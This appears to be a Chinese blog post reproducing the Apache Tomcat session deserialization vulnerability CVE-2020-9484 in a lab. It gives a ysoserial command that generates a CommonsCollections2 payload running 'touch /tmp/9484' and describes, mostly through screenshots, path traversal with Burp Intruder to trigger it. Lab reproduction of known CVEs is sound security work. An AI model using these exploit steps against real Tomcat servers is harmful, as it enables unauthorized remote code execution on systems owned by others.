# Apache #Tomcat CVE-2020-9484 - xyongsec - 博客园

> 原文：[`www.cnblogs.com/xyongsec/p/13175132.html`](https://www.cnblogs.com/xyongsec/p/13175132.html)

# CVE-2020-9484

用 Kali 2.0 复现 Apache Tomcat Session 反序列化代码执行漏洞 CVE-2020-9484

## 环境：

1.  Kali 2.0
2.  apache-tomcat-7.0.61-CVE-2020-9484.tar.gz（webapp 是 s2-053，在其 lib 下加了 commons-collections4-4.0.jar）

## 启动

/yourtomcatdir/bin/startup.sh 

![](img/fb4d95ef869b0493a91801393014f7fc.png)

## 生成 payload

java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections2 "touch /tmp/9484" > /tmp/22222.session

## 利用

先访问 S2-053 看是否启动正常： [`192.168.152.128:8080/s2-053/`](http://192.168.152.128:8080/s2-053/) 

![](img/315ce74d27f3f1b0a4b57838149c2bcf.png)

重新访问抓包，用 intruder 进行路径遍历 

![](img/66b5958454d4e369df1d54cc81853daa.png)

![](img/03171209e90dc06428c21f5d4b69106c.png)

执行命令成功： 

https://github.com/IdealDreamLast/CVE-2020-9484/raw/master/img/ok.png

本文转自[`github.com/IdealDreamLast/CVE-2020-9484/`](https://github.com/IdealDreamLast/CVE-2020-9484/)